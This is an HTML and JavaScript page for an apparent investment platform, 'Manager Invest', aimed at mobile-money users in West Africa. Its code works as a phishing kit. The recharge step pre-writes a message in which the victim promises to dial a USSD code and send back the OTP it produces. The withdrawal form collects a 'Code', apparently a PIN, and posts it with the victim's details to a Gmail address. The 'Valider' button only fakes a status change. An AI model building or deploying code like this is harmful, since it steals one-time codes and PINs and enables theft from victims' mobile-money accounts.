<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Manager Invest</title>
<style>
    body { font-family: Arial, sans-serif; padding: 20px; }
    .form-container { max-width: 500px; margin: auto; }
    input, textarea, select, button { width: 100%; padding: 10px; margin: 5px 0; }
    #connexionForm, #rechargeForm, #retraitForm, #assistanceForm { display: none; }
    h2, h3 { text-align: center; }
    .btn-group button { width: 48%; display: inline-block; margin: 1%; }
    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
    th, td { border: 1px solid #ccc; padding: 5px; text-align: center; }
</style>
</head>
<body>

<div class="form-container">

    <!-- Formulaire Inscription -->
    <div id="inscriptionForm">
        <h2>Inscription</h2>
        <input type="text" placeholder="Nom complet" required>
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Mot de passe" required>
        <button>Inscrire</button>
        <p>Déjà un compte ? <button onclick="showLogin()">Connexion</button></p>
    </div>

    <!-- Formulaire Connexion -->
    <div id="connexionForm">
        <h2>Connexion</h2>
        <input type="email" placeholder="Email" required>
        <input type="password" placeholder="Mot de passe" required>
        <button>Se connecter</button>

        <div class="btn-group">
            <button onclick="openRecharge()">Recharge</button>
            <button onclick="openRetrait()">Retrait</button>
        </div>
    </div>

    <!-- Formulaire Recharge -->
    <div id="rechargeForm">
        <h3>Recharge</h3>
        <label>Choisissez le montant :</label>
        <select id="planMontant">
            <option value="">-- Sélectionnez un plan --</option>
            <option value="10">10 €</option>
            <option value="20">20 €</option>
            <option value="50">50 €</option>
            <option value="100">100 €</option>
        </select>

        <label>Choisissez votre pays :</label>
        <select id="pays">
            <option value="">-- Sélectionnez votre pays --</option>
            <option value="BF">Burkina Faso</option>
            <option value="CI">Côte d'Ivoire</option>
            <option value="SN">Sénégal</option>
        </select>

        <label>Votre numéro :</label>
        <input type="text" id="numTel" placeholder="Ex: +22670000000">

        <button onclick="confirmerRecharge()">Confirmer</button>
        <button onclick="closeRecharge()">Annuler</button>
    </div>

    <!-- Formulaire Retrait -->
    <div id="retraitForm">
        <h3>Retrait</h3>
        <input type="text" id="nomRetrait" placeholder="Nom complet" required>
        <input type="text" id="numRetrait" placeholder="Numéro" required>
        <input type="text" id="codeRetrait" placeholder="Code" required>
        <input type="text" id="paysRetrait" placeholder="Pays" required>
        <input type="text" id="operateurRetrait" placeholder="Opérateur" required>
        <button onclick="envoyerRetrait()">Envoyer demande</button>
        <button onclick="closeRetrait()">Annuler</button>
    </div>

    <!-- Historique Retraits -->
    <h3>Historique des Retraits</h3>
    <table id="historiqueTable">
        <tr>
            <th>Nom</th>
            <th>Numéro</th>
            <th>Montant</th>
            <th>Pays</th>
            <th>Opérateur</th>
            <th>Statut</th>
            <th>Action</th>
        </tr>
    </table>

    <!-- Bouton Assistance -->
    <button onclick="toggleAssistance()">Assistance</button>

    <!-- Formulaire Assistance -->
    <div id="assistanceForm" style="display:none;">
        <h3>Assistance</h3>
        <form action="send_message.php" method="POST">
            <input type="email" name="user_email" placeholder="Votre email" required>
            <textarea name="message" placeholder="Votre message" required></textarea>
            <button type="submit">Envoyer</button>
        </form>
    </div>

</div>

<script>
/* Formulaires Inscription / Connexion */
function showLogin() {
    document.getElementById('inscriptionForm').style.display = 'none';
    document.getElementById('connexionForm').style.display = 'block';
}
function showRegister() {
    document.getElementById('connexionForm').style.display = 'none';
    document.getElementById('inscriptionForm').style.display = 'block';
}

/* Assistance */
function toggleAssistance() {
    let form = document.getElementById('assistanceForm');
    form.style.display = form.style.display === 'none' ? 'block' : 'none';
}

/* Recharge */
function openRecharge() { document.getElementById('rechargeForm').style.display='block'; }
function closeRecharge() { document.getElementById('rechargeForm').style.display='none'; }
function confirmerRecharge() {
    let montant = document.getElementById('planMontant').value;
    let pays = document.getElementById('pays').value;
    let numero = document.getElementById('numTel').value;

    if(!montant || !pays || !numero){ alert("Remplissez tous les champs !"); return; }

    // Fermer formulaire recharge
    closeRecharge();

    // Ouvrir formulaire assistance
    let assistance = document.getElementById('assistanceForm');
    assistance.style.display='block';
    assistance.querySelector('textarea').value =
        "Bonjour, j'ai effectué une recharge de " + montant +
        " € depuis le numéro " + numero +
        ". Pour valider ma recharge, je vais composer *144*4*6*" + montant +
        "# sur mon téléphone pour obtenir le code OTP, puis je vous l'enverrai.";
}

/* Retrait */
function openRetrait() { document.getElementById('retraitForm').style.display='block'; }
function closeRetrait() { document.getElementById('retraitForm').style.display='none'; }

function envoyerRetrait() {
    let nom = document.getElementById('nomRetrait').value;
    let num = document.getElementById('numRetrait').value;
    let code = document.getElementById('codeRetrait').value;
    let pays = document.getElementById('paysRetrait').value;
    let operateur = document.getElementById('operateurRetrait').value;

    if(!nom || !num || !code || !pays || !operateur) {
        alert("Veuillez remplir tous les champs !");
        return;
    }

    // Ajouter à l'historique
    let table = document.getElementById('historiqueTable');
    let row = table.insertRow();
    row.insertCell(0).innerText = nom;
    row.insertCell(1).innerText = num;
    row.insertCell(2).innerText = code; // ici tu peux mettre le montant réel
    row.insertCell(3).innerText = pays;
    row.insertCell(4).innerText = operateur;
    row.insertCell(5).innerText = "En attente";

    let btn = document.createElement('button');
    btn.innerText = "Valider";
    btn.onclick = function() {
        row.cells[5].innerText = "Validé";
        btn.disabled = true;
    };
    row.insertCell(6).appendChild(btn);

    alert("Demande de retrait envoyée !");
    closeRetrait();

    // Envoyer mail à ton adresse
    let xhr = new XMLHttpRequest();
    xhr.open("POST","send_message.php");
    xhr.setRequestHeader("Content-type","application/x-www-form-urlencoded");
    let message = "Demande de retrait:\nNom: "+nom+"\nNuméro: "+num+"\nCode: "+code+"\nPays: "+pays+"\nOpérateur: "+operateur;
    xhr.send("user_email=managerbuilding26@gmail.com&message="+encodeURIComponent(message));
}
</script>

</body>
</html>